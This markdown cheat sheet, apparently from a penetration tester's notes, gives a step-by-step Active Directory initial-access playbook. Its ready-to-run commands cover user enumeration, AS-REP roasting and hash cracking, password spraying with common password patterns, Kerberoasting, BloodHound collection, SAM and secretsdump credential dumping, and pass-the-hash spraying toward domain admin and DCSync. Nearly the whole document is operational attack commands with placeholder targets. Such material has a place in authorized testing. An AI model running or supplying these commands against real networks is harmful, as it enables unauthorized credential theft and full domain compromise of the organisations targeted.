# Kerbrute, Password Spray & AS-REP Roasting

Standard initial access techniques for Active Directory environments. These work with no prior credentials beyond a network foothold.

---

## Step 1 - Enumerate Users First

You need usernames before you can do anything credential-based.

```sh
# RID brute via null/guest session (no creds needed)
nxc smb <DC-IP> -u '' -p '' --rid-brute
nxc smb <DC-IP> -u 'guest' -p '' --rid-brute

# Kerbrute - enumerate valid usernames via Kerberos (no lockout risk)
kerbrute userenum --dc <DC-IP> -d corp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# LDAP anonymous (if allowed)
ldapsearch -H ldap://<DC-IP> -x -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName

# enum4linux - pulls users if null session works
enum4linux -a <DC-IP>
```

---

## Step 2 - AS-REP Roasting (No Creds Needed)

Targets accounts with "Do not require Kerberos preauthentication." You only need a username list.

```sh
# From Linux (Impacket)
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip <DC-IP> -format hashcat -no-pass

# Crack the hash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

If cracked -> you now have valid domain credentials -> move to Step 4.

---

## Step 3 - Password Spraying

Use discovered usernames + common password patterns. **Check lockout policy first.**

```sh
# Check lockout policy (how many attempts before lockout)
nxc smb <DC-IP> -u '' -p '' --pass-pol
crackmapexec smb <DC-IP> --pass-pol

# Spray - slow and careful (1 attempt per user, then wait)
kerbrute passwordspray --dc <DC-IP> -d corp.local users.txt 'Password2024!'
kerbrute passwordspray --dc <DC-IP> -d corp.local users.txt 'Welcome1'

# NetExec spray (stop on first hit if you're worried about lockout)
nxc smb <DC-IP> -u users.txt -p 'Password2024!' --no-bruteforce --continue-on-success
```

**Common password patterns to try:**
```
Season+Year:   Spring2024!, Summer2024!, Winter2024!
Company+Year:  Corp2024!, Company123!
Welcome:       Welcome1, Welcome123!
Password:      Password1, Password123!
Months:        January2024!, February2024!
```

---

## Step 4 - With Valid Credentials, Enumerate Everything

```sh
# Check what you can access
nxc smb <cidr> -u user -p pass -d corp.local          # find Pwn3d! machines
nxc smb <DC-IP> -u user -p pass --shares               # accessible shares
nxc winrm <cidr> -u user -p pass                       # WinRM access?
nxc rdp <cidr> -u user -p pass                         # RDP access?

# BloodHound collection
bloodhound-python -d corp.local -u user -p pass -ns <DC-IP> -c all

# Kerberoasting - needs any valid domain user
GetUserSPNs.py corp.local/user:pass -dc-ip <DC-IP> -request
```

---

## Step 5 - Exploit What You Find

| BloodHound shows | Attack |
|---|---|
| You have local admin on a machine | PTH -> shell -> dump creds |
| Kerberoastable users | Crack TGS -> more creds |
| AS-REP roastable users | Already done in Step 2 |
| GenericAll/WriteDACL path | ACL abuse -> password reset -> escalate |
| Unconstrained delegation machine | [Delegation Attacks](../post-compromise/delegation-attacks.md) |

---

## If You Have a Shell on a Domain Machine (Not DC)

```sh
# Dump local creds
nxc smb <ip> -u admin -H <hash> --local-auth --sam
secretsdump.py ./admin:<pass>@<ip>

# Spray those creds across the network
nxc smb <cidr> -u admin -H <hash> --local-auth

# If domain user cached - run BloodHound
bloodhound-python -d corp.local -u user -p pass -ns <DC-IP> -c all
```

---

## Common AD Initial Access Path

```
Enumerate users (RID brute / kerbrute)
    v
AS-REP roast -> crack hash -> domain user
    OR
Password spray -> domain user
    v
BloodHound + Kerberoast
    v
Find path to DA (ACL abuse / local admin chain / delegation)
    v
Dump NTDS.dit / DCSync
```
